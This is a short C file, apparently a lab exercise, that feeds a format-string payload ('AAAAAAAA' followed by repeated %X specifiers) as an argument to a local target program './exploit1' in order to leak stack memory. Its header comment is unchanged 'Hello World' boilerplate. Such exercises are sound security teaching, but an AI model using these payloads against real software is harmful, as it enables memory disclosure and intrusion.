/*
 ============================================================================
 Name        : attack1.c
 Author      : weizhou
 Version     :
 Copyright   : Your copyright notice
 Description : Hello World in C, Ansi-style
 ============================================================================
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define DEFAULT_BUFFER_SIZE     256
static char attackingcode[] =
  "AAAAAAAA%X%X%X%X%X%X%X%X%X%X%X%X";

int main(void) {
	char *buff, *ptr;
	int bsize=DEFAULT_BUFFER_SIZE;
	if (!(buff = malloc(bsize))) {
		printf("Can't allocate memory.\n");
		exit(0);
	}
	int i;
	ptr=buff;
	for (i = 0; i < strlen(attackingcode); i++) *(ptr++) = attackingcode[i];
	buff[bsize - 1] = '\0';
	//memcpy(buff,"EGG=",4);
	//putenv(buff);
	execl("./exploit1","exploit1",buff,NULL);
}
